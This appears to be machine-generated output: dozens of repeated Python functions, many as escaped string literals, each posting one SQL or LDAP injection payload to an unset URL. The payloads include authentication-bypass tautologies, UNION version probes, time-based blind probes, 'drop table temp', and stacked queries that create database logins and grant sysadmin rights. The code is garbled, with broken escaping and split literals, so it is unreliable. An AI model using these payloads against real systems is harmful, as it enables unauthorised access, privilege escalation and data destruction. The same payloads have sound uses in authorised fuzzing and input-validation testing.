                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'create user name identified by pass123 temporary tablespace temp default tablespace users;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' ; drop table temp --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'exec sp_addlogin 'name' , 'password' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' exec sp_addsrvrolemember 'name' , 'sysadmin' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' grant connect to name; grant resource to name; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select @@version) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL,  (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL, NULL,  (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221'1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 exec sp_ \x28or exec xp_\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 and 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221' and 1=(select count(*) from tablenames); --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221' or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22)%20or%20('x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; execute immediate 'sel' || 'ect us' || 'er'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22update\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22;waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||\x28elt\x28-3+5,bin\x2815\x29,ord\x2810\x29,hex\x28char\x2845\x29\x29\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22hi\\x22\\x22\x29 or \x28\\x22\\x22a\\x22\\x22=\\x22\\x22a\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22delete\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22like\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*\x28|\x28objectclass=*\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 0x730065006c00650063 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22insert\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22; exec xp_regread\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*|\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x40var select \x40var as var into temp end --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22asc\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28||6\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22a\\x22\\x22 or 3=3--\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22# from wapiti\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221 waitfor delay '0:0:10'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22hi or 1=1 --\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a = a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22UNION ALL SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 'a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2221 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22limit\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 2 > 1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
